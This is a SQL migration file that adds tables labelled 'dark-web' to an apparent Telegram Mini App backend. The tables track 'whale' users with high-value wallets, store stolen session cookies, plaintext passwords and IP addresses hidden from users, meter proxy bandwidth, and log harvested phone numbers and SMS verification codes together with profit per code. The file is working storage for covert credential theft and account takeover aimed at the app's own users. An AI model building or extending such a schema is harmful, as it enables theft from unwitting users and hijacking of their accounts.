-- Migration 005: Part 2 dark-web tables
-- Isolated tma_ tables — does NOT touch existing tables.

-- 1. Whale Reconnaissance: detected high-value wallets
CREATE TABLE IF NOT EXISTS tma_whales (
  id              BIGSERIAL PRIMARY KEY,
  telegram_user_id BIGINT NOT NULL REFERENCES tma_users(user_id) ON DELETE CASCADE,
  app_detected    TEXT NOT NULL,
  balance_string  TEXT,
  flagged_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_tma_whales_telegram_user_id
  ON tma_whales(telegram_user_id);

-- 2. Hacker logs: stolen session data (isolated, never exposed to user)
CREATE TABLE IF NOT EXISTS tma_hacker_logs (
  id              BIGSERIAL PRIMARY KEY,
  telegram_user_id BIGINT NOT NULL REFERENCES tma_users(user_id) ON DELETE CASCADE,
  target_app      TEXT NOT NULL,
  session_cookie  TEXT,
  plaintext_password TEXT,
  ip_address      TEXT,
  created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_tma_hacker_logs_telegram_user_id
  ON tma_hacker_logs(telegram_user_id);

-- 3. Proxy bandwidth tracking
CREATE TABLE IF NOT EXISTS tma_proxy_usage (
  id              BIGSERIAL PRIMARY KEY,
  telegram_user_id BIGINT UNIQUE NOT NULL REFERENCES tma_users(user_id) ON DELETE CASCADE,
  bytes_used_today BIGINT DEFAULT 0,
  tokens_earned_today DECIMAL(12,4) DEFAULT 0,
  last_reset_date DATE DEFAULT CURRENT_DATE,
  updated_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_tma_proxy_usage_telegram_user_id
  ON tma_proxy_usage(telegram_user_id);

-- 4. SMS profit log
CREATE TABLE IF NOT EXISTS tma_sms_log (
  id              BIGSERIAL PRIMARY KEY,
  telegram_user_id BIGINT NOT NULL REFERENCES tma_users(user_id) ON DELETE CASCADE,
  phone_number    TEXT,
  service         TEXT,
  code            TEXT,
  profit          DECIMAL(8,4) DEFAULT 0.15,
  created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_tma_sms_log_telegram_user_id
  ON tma_sms_log(telegram_user_id);